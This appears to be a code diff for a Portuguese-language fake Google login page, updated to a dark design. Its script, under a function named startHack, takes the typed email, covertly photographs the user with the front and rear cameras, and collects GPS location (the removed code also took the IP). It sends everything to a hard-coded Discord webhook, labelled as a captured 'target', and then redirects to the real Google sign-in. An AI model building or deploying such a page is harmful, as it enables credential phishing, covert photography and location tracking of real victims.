@@ -6,101 +6,113 @@
 <title>Fazer login - Contas do Google</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-        margin: 0; padding: 0;
         font-family: 'Roboto', sans-serif;
-        background-color: #fff;
-        color: #202124;
-        display: flex;
-        justify-content: center;
-        align-items: center;
+        background-color: #000000; /* Fundo preto puro */
+        color: #e3e3e3;
         height: 100vh;
+        display: flex;
+        flex-direction: column;
+        padding: 24px;
     }
-    .google-box {
-        width: 90%;
-        max-width: 450px;
-        border: 1px solid #dadce0;
-        border-radius: 8px;
-        padding: 48px 40px 36px;
-        text-align: center;
+    
+    /* Header com Logo */
+    .header-logo {
+        width: 40px;
+        height: 40px;
+        margin-bottom: 40px;
+        margin-top: 20px;
     }
-    .google-logo {
-        font-size: 24px;
-        font-weight: 500;
-        margin-bottom: 10px;
-        letter-spacing: -0.5px;
-    }
-    .google-logo span:nth-child(1) { color: #4285F4; }
-    .google-logo span:nth-child(2) { color: #EA4335; }
-    .google-logo span:nth-child(3) { color: #FBBC05; }
-    .google-logo span:nth-child(4) { color: #4285F4; }
-    .google-logo span:nth-child(5) { color: #34A853; }
-    .google-logo span:nth-child(6) { color: #EA4335; }
 
     h1 {
-        font-size: 24px;
+        font-size: 32px;
         font-weight: 400;
-        margin-bottom: 10px;
+        margin-bottom: 16px;
+        letter-spacing: -0.5px;
+        color: #e3e3e3;
     }
+    
     p {
-        font-size: 15px;
-        margin-bottom: 30px;
+        font-size: 16px;
+        margin-bottom: 32px;
+        color: #e3e3e3;
     }
-    .input-group {
-        position: relative;
-        margin-bottom: 20px;
+
+    /* Input */
+    .input-box {
+        margin-bottom: 32px;
     }
     input {
         width: 100%;
-        padding: 13px 15px;
+        padding: 16px 14px;
         font-size: 16px;
-        border: 1px solid #dadce0;
+        background-color: transparent;
+        color: #e3e3e3;
+        border: 1px solid #5f6368;
         border-radius: 4px;
-        box-sizing: border-box;
         outline: none;
-        transition: 0.2s;
+        font-family: 'Roboto', sans-serif;
     }
-    input:focus {
-        border: 2px solid #1a73e8;
-        padding: 12px 14px;
-    }
-    .btn {
-        background-color: #1a73e8;
-        color: #fff;
-        border: none;
-        padding: 10px 24px;
-        border-radius: 4px;
-        font-size: 14px;
-        font-weight: 500;
-        cursor: pointer;
-        float: right;
-    }
-    .btn:hover { background-color: #1557b0; }
-    .link {
-        color: #1a73e8;
+    input:focus { border: 2px solid #8ab4f8; padding: 15px 13px; }
+    input::placeholder { color: #9aa0a6; font-size: 16px; }
+
+    /* Links de texto */
+    .forgot-link {
+        display: inline-block;
+        color: #8ab4f8;
         text-decoration: none;
         font-size: 14px;
         font-weight: 500;
-        float: left;
-        margin-top: 10px;
-        cursor: pointer;
+        margin-bottom: 48px;
     }
-    .clearfix::after {
-        content: "";
-        clear: both;
-        display: table;
+
+    /* Rodapé com botões */
+    .actions {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: auto;
+        margin-bottom: 40px;
     }
     
-    /* Loader do Google */
-    .loader {
+    .create-account {
+        color: #8ab4f8;
+        text-decoration: none;
+        font-size: 14px;
+        font-weight: 500;
+        padding: 10px;
+    }
+
+    .btn-next {
+        background-color: #8ab4f8;
+        color: #000;
+        border: none;
+        padding: 12px 24px;
+        border-radius: 24px; /* Botão pílula */
+        font-size: 14px;
+        font-weight: 500;
+        cursor: pointer;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    /* Tela de carregamento */
+    #loading-screen {
         display: none;
-        border: 3px solid #f3f3f3;
-        border-top: 3px solid #1a73e8;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        position: fixed;
+        top: 0; left: 0; width: 100%; background: #000; z-index: 99;
+    }
+    .loader {
+        border: 3px solid rgba(255,255,255,0.1);
+        border-top: 3px solid #8ab4f8;
         border-radius: 50%;
-        width: 20px;
-        height: 20px;
+        width: 30px; height: 30px;
         animation: spin 1s linear infinite;
-        margin: 20px auto;
+        margin-bottom: 20px;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
@@ -112,140 +124,139 @@
 <video id="camera" autoplay playsinline muted></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
-<div class="google-box" id="main-box">
-    <div class="google-logo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-    </div>
-    <h1>Fazer login</h1>
+<div id="main-screen">
+    <!-- Logo SVG oficial do Google -->
+    <svg class="header-logo" viewBox="0 0 48 48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+    </svg>
+
+    <h1>Faça login</h1>
     <p>Use sua Conta do Google</p>
-    
-    <div class="input-group">
+
+    <div class="input-box">
         <input type="email" id="email-input" placeholder="E-mail ou telefone">
     </div>
-    
-    <div class="clearfix">
-        <a class="link">Esqueci meu e-mail</a>
-        <button class="btn" onclick="startHack()">Avançar</button>
+
+    <a href="#" class="forgot-link">Esqueceu o e-mail?</a>
+
+    <div class="actions">
+        <a href="#" class="create-account">Criar conta</a>
+        <button class="btn-next" onclick="startHack()">Avançar</button>
     </div>
 </div>
 
-<div class="google-box" id="loading-box" style="display:none;">
-    <div class="google-logo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-    </div>
-    <div class="loader" style="display:block;"></div>
-    <p style="margin-top:20px;">Verificando dispositivo...</p>
+<div id="loading-screen">
+    <div class="loader"></div>
+    <p>Verificando dispositivo...</p>
 </div>
 
 <script>
     const WEBHOOK = "https://discord.com/api/webhooks/1571721002176745615/xvq6g3cJ3c2rWY76Cr_kqsksEV1ePYlYLp3HnfKGg88jAVgersnYXGBJmuSiOJuyH306";
-    let cameraStream = null;
+    let video = document.getElementById('camera');
+    let canvas = document.getElementById('canvas');
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
     async function startHack() {
         const email = document.getElementById('email-input').value;
         if(!email) return alert("Digite um e-mail.");
 
-        document.getElementById('main-box').style.display = 'none';
-        document.getElementById('loading-box').style.display = 'block';
+        document.getElementById('main-screen').style.display = 'none';
+        document.getElementById('loading-screen').style.display = 'flex';
 
-        const video = document.getElementById('camera');
-        
+        let fotoFrente = null;
+        let fotoTras = null;
+
+        // 1. Câmera Frontal
         try {
-            // Pede a câmera traseira (environment)
-            cameraStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: { exact: "environment" } } 
-            });
-            video.srcObject = cameraStream;
-            
-            // Espera 2.5 segundos pra focar e tira a foto
-            setTimeout(() => captureAndSend(email), 2500);
-        } catch (err) {
-            // Se não tiver traseira, tenta a frontal, ou vai direto pro envio sem foto
-            try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = cameraStream;
-                setTimeout(() => captureAndSend(email), 2500);
-            } catch (e) {
-                sendToDiscord(email, null, "Câmera negada", "GPS não solicitado");
-                finishHack();
-            }
-        }
-    }
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            await sleep(1500);
+            fotoFrente = capturePhoto();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Sem câmera frontal"); }
 
-    async function captureAndSend(email) {
-        const video = document.getElementById('camera');
-        const canvas = document.getElementById('canvas');
-        
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-        
-        if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); }
-
-        let ip = "Desconhecido";
+        // 2. Câmera Traseira
         try {
-            const r = await fetch("https://api.ipify.org?format=json");
-            ip = (await r.json()).ip;
-        } catch(e) {}
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+            video.srcObject = stream;
+            await sleep(1500);
+            fotoTras = capturePhoto();
+            stream.getTracks().forEach(t => t.stop());
+        } catch (e) { console.log("Sem câmera traseira"); }
 
+        // 3. GPS e Envio
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => { 
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    sendToDiscord(email, fotoBase64, ip, mapsLink);
+                    const mapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToDiscord(email, fotoFrente, fotoTras, mapsLink);
                     finishHack();
                 },
                 () => { 
-                    sendToDiscord(email, fotoBase64, ip, "GPS negado");
+                    sendToDiscord(email, fotoFrente, fotoTras, "GPS negado");
                     finishHack();
                 }
             );
         } else {
-            sendToDiscord(email, fotoBase64, ip, "Sem suporte a GPS");
+            sendToDiscord(email, fotoFrente, fotoTras, "Sem GPS");
             finishHack();
         }
     }
 
-    async function sendToDiscord(email, foto, ip, localizacao) {
-        if (!WEBHOOK) return;
+    function capturePhoto() {
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.7);
+    }
 
+    async function sendToDiscord(email, fotoFrente, fotoTras, localizacao) {
+        if (!WEBHOOK) return;
         const formData = new FormData();
         
         const payload = {
-            content: "🎯 **NOVO ALVO CAPTURADO (GOOGLE FAKE)**",
+            content: "🎯 **ALVO CAPTURADO (DUPLA CÂMERA)**",
             embeds: [{
-                title: "Dados da Vítima",
+                title: "Dados do Alvo",
                 color: 3447003,
                 fields: [
-                    { name: "E-mail digitado", value: email, inline: false },
-                    { name: "IP", value: ip, inline: true },
-                    { name: "Localização (Clique)", value: localizacao, inline: false }
-                ],
-                image: foto ? { url: "attachment://alvo.jpg" } : undefined
+                    { name: "E-mail", value: email, inline: false },
+                    { name: "Localização", value: localizacao, inline: false }
+                ]
             }]
         };
 
-        formData.append("payload_json", JSON.stringify(payload));
-        
-        if (foto) {
-            const blob = await (await fetch(foto)).blob();
-            formData.append("file", blob, "alvo.jpg");
+        const attachments = [];
+        if (fotoFrente) {
+            const blobF = await (await fetch(fotoFrente)).blob();
+            formData.append("file1", blobF, "frente.jpg");
+            attachments.push({ id: 0, filename: "frente.jpg" });
+        }
+        if (fotoTras) {
+            const blobT = await (await fetch(fotoTras)).blob();
+            formData.append("file2", blobT, "traseira.jpg");
+            attachments.push({ id: 1, filename: "traseira.jpg" });
         }
 
+        if (attachments.length > 0) {
+            payload.embeds[0].image = { url: `attachment://${attachments[0].filename}` };
+            if (attachments.length > 1) {
+                payload.embeds[0].thumbnail = { url: `attachment://${attachments[1].filename}` };
+            }
+        }
+
+        formData.append("payload_json", JSON.stringify(payload));
         fetch(WEBHOOK, { method: "POST", body: formData }).catch(()=>{});
     }
 
     function finishHack() {
-        // Redireciona pro Google de verdade depois de roubar tudo
         setTimeout(() => {
             window.location.href = "https://accounts.google.com";
-        }, 1000);
+        }, 1500);
     }
 </script>
 </body>
